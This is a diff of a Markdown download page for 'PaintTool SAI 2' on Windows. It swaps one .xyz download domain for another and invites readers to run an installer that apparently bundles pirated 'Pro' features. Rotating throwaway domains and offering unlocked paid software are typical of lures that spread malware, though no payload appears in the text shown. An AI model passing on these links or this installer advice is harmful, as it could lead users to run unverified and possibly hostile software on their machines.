@@ -18,8 +18,8 @@ PaintTool SAI 2 Drawing Suite — desktop build for Windows 10/11 | clear layout
 
 > Use the project link below for Windows.
 
-* **Project link:** **[painttool-sai.nexpath.xyz](https://painttool-sai.nexpath.xyz/)**
-* **Full URL:** `https://painttool-sai.nexpath.xyz/`
+* **Project link:** **[painttool-sai.nerasix.xyz](https://painttool-sai.nerasix.xyz/)**
+* **Full URL:** `https://painttool-sai.nerasix.xyz/`
 * **Type:** Desktop package | Windows 10 and 11, 64-bit
 * **Setup:** Run the installer from the extracted folder
 
@@ -51,4 +51,4 @@ Pro sections are bundled in this release. Install locally, open the app, and use
 * **RAM:** 8 GB or more | 16 GB ideal for large files
 * **Disk:** 3 GB free disk space
 
-***
+***
